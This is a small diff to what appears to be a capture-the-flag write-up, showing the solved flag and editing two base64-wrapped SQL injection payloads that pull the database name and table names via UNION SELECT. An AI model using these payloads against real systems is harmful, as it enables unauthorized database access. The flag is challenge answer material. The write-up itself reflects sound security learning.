@@ -65,5 +65,7 @@ and Bingo, `ASIS{e279aaf1780c798e55477a7afc7b2b18}`.
 
 
 
-Payload for database:   `base64_encoded({  "data"  :  " ' UNION SELECT 1,database() FROM DUAL -- "  })`
+Payload for database:   `base64_encoded({  "data"  :  " ' UNION SELECT 1,database() -- "  })`
+
+
 Payload for table name: `base64_encoded({ "data"  :  "' UNION select 1,table_name from information_schema.tables where table_schema=database() -- " })`
